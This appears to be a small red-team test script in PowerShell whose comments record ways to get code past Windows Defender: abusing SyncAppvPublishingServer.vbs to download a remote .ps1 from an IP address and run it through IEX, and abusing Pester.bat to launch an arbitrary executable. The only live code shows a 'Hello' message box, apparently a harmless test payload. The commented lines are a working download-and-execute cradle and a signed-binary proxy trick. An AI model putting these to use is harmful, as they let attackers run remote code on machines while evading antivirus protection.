# C:\Windows\System32\SyncAppvPublishingServer.vbs "((New-Object Net.WebClient).DownloadString('http://172.22.239.186:8000/TESTVBS.ps1') | IEX)"
# allows the user to run powershell when 'real time threat protection' is not enabled and 'virus protection' is enabled.
#
# http://172.22.239.186:8000/testbd.ps1

# "C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat" ;start "C:\Users\Jason Todd\Desktop\testbd.exe"
#  allows the user to execute a target exe using the context of Pester.bat

Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello')
